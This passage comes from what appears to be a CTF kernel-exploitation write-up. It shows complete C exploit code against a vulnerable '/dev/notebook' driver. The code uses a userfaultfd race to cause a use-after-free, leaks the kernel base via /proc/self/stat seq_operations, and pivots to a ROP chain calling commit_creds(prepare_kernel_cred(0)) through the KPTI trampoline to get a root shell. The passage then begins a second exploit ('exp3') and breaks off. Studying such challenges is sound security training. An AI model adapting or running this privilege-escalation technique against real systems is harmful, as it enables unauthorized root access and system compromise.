class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_start_func = <span class="number">0xFFFFFFFF8128C230</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret = <span class="number">0xffffffff81007115</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_1a8 = <span class="number">0xffffffff816473a4</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsp_ret = <span class="number">0xffffffff810bc110</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kpti_trampoline_addr = <span class="number">0xFFFFFFFF81A0093F</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_pop_rdx_pop_ret = <span class="number">0xffffffff810d7324</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rbp_ret = <span class="number">0xffffffff81478d44</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_rdi_rax_pop_ret = <span class="number">0xffffffff8110d81a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> cc_addr = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pkc_addr = <span class="number">0xFFFFFFFF810A9EF0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// sleep(1);   //给1s缓冲时间，让size值写上</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);              <span class="comment">// in kernel it will kmalloc(0x20)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)ret_buf;</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            index = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. leak kernel base: read heap1</span></span><br><span class="line">    kernel_base = leak_addr - (single_start_func - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. hijack control flow: write heap1, then trigger &#x27;seq_operations-&gt;start&#x27;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> control_rip = add_rsp_1a8 - bzImage_base + kernel_base;</span><br><span class="line">    write_note((<span class="keyword">char</span>*)&amp;control_rip,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 7. stack pivot: use the gift func ^_^</span></span><br><span class="line">    save_status();</span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">1</span>,<span class="number">0x200</span>,name);</span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    heap_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);                 <span class="comment">// heap addr</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> gadget_buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gadget_buf[a++] = pop_rdi_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;                                     </span><br><span class="line">    gadget_buf[a++] = pkc_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = pop_rsi_pop_rdx_pop_ret - bzImage_base + kernel_base;     <span class="comment">// mov rdi, rax</span></span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = pop_rbp_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = mov_rdi_rax_pop_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = cc_addr - bzImage_base + kernel_base;;</span><br><span class="line">    gadget_buf[a++] = kpti_trampoline_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;           </span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = (<span class="keyword">uint64_t</span>)getshell;</span><br><span class="line">    gadget_buf[a++] = user_cs;</span><br><span class="line">    gadget_buf[a++] = user_rflags;</span><br><span class="line">    gadget_buf[a++] = user_sp;</span><br><span class="line">    gadget_buf[a++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write_note(gadget_buf,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. trigger</span></span><br><span class="line">    temp_fd = fd[index];</span><br><span class="line">    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x13131313;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x12121212;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x10101010;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, pop_rsp_ret;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, heap_addr;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x99999999;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp3"   >
          <a href="#exp3" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3>
      <blockquote>
<p>用户态注册signal handler， 获得root shell</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 